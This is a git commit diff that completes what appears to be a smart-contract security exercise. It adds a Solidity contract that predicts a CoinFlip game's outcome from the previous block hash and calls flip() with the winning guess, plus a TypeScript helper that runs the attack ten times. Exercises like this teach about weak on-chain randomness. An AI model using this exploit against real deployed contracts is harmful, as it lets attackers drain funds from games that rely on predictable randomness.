5656f3edea7ac0410948dcd5084f8fb3bf049c8d
cryptonomicon46 <sandman2145@gmail.com>
2022-11-22 12:40:10 -0800

    CoinFlip attack complete

--- contracts/1. CoinFlip/AttackingCoinFlip.sol
+++ contracts/1. CoinFlip/AttackingCoinFlip.sol
@@ -1,15 +1,31 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.9;
 import "./CoinFlip.sol";
+import "hardhat/console.sol";
 
 contract AttackingCoinFlip {
     address public contractAddress;
+    CoinFlip coinflip;
+    bool public side;
+    uint256 private constant FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
 
     constructor(address _contractAddress) {
         contractAddress = _contractAddress;
     }
 
-    function hackContract() external {
+    function hackContract() external  {
         // Code me!
+        coinflip = CoinFlip(contractAddress);
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        uint256 cf = blockValue / FACTOR;
+         side = cf == 1 ? true : false;
+         console.log(side);
+        (bool success,) = contractAddress.call(abi.encodeWithSignature("flip(bool)",side));
+        require(success);
+        //  contractAddress.call.flip(side);
+        
+
     }
 }
--- contracts/1. CoinFlip/CoinFlipHelper.ts
+++ contracts/1. CoinFlip/CoinFlipHelper.ts
@@ -3,6 +3,15 @@ import { ethers } from "hardhat";
 
 const helper = async (victim: any, attacker: any) => {
   // add code here that will help you pass the test
+
+var side;
+var wins;
+ var i= 0 ;
+ var yourTx;
+ while(i<10) {
+    await attacker.hackContract();
+    i++
+ }
 };
 
 export default helper;
